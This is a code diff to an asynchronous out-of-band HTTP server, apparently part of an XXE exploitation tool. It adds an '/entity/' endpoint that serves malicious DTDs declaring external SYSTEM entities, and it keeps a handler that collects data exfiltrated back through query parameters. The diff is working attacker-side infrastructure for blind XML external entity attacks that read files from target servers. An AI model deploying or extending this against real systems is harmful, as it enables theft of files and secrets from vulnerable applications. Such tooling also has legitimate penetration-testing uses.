@@ -35,16 +35,38 @@ class OOBHttpRequestHandler(server.ServerHttpProtocol):
         response.add_header('Content-type', 'text/xml')
 
         response.send_headers()
+        parsed = parse.urlparse(message.path)
+        parsed_data = parse.parse_qs(parsed.query)
 
-        if message.path == "/test":
+        if message.path.startswith("/entity/"):
+            file_id = message.path.replace("/entity/", "")
+            use_comment = False
+            if file_id == "test":
+                entity_value = '"{}"'.format(self.TEST_RESPONSE)
+            elif self.server.expecting_identifier(file_id):
+                use_comment, value = self.server.get_entity_value(file_id)
+                entity_value = 'SYSTEM "{}"'.format(value)
+            else:
+                return response.force_close()
+
+            data_value = "&c;"
+            if use_comment:
+                data_value = "<!-- {} -->".format(data_value)
+
+            response.write(bytes("""<!DOCTYPE stuff [
+             <!ELEMENT data ANY>
+             <!ENTITY c {}>
+             ]>
+             <data>{}</data>""".format(entity_value, data_value), "utf-8"))
+        elif message.path == "/test":
             response.write(bytes("<test>{}</test>".format(self.TEST_RESPONSE), "utf8"))
         else:
-            parsed = parse.urlparse(message.path)
             identifier = parsed.path.lstrip("/")
             if not self.server.expecting_identifier(identifier):
                 return response.force_close()
+            if "d" not in parsed_data:
+                parsed_data["d"] = []
 
-            parsed_data = parse.parse_qs(parsed.query)
             self.server.got_data(identifier, parsed_data)
 
             response.write(bytes("<test>{}</test>".format(identifier), "utf-8"))
@@ -56,6 +78,9 @@ class OOBHttpRequestHandler(server.ServerHttpProtocol):
 
 class OOBHttpServer(object):
     expectations = {}
+    serve_files = {}
+
+    _lock = asyncio.Lock()
 
     def __init__(self, host=None, port=None):
         self.tick = 0
@@ -70,6 +95,14 @@ class OOBHttpServer(object):
     def expecting_identifier(self, identifier):
         return identifier in self.expectations
 
+    def get_entity_value(self, id):
+        return self.serve_files[id]
+
+    def expect_entity_injection(self, entity_value, use_comment=False):
+        tick, future = self.expect_data()
+        self.serve_files[tick] = (use_comment, entity_value)
+        return tick, future
+
     def expect_data(self):
         self.tick += 1
         future = asyncio.Future()
@@ -82,23 +115,25 @@ class OOBHttpServer(object):
 
     @asyncio.coroutine
     def start(self, port=None):
-        if self.server is not None:
-            raise RuntimeError("Server has already been started")
+        with (yield from self._lock):
+            if self.server is not None:
+                return #raise RuntimeError("Server has already been started")
 
-        if port:
-            self.port = port
+            if port:
+                self.port = port
 
-        loop = asyncio.get_event_loop()
-        self.server = yield from loop.create_server(
-            self.create_handler,
-            "0.0.0.0", self.port
-        )
-        return
+            loop = asyncio.get_event_loop()
+            self.server = yield from loop.create_server(
+                self.create_handler,
+                "0.0.0.0", self.port
+            )
+            return
 
     def stop(self):
         if self.server is None:
-            raise RuntimeError("Server has not been started!")
+            return #raise RuntimeError("Server has not been started!")
         self.server.close()
+        self.server = None
 
     @property
     def started(self):
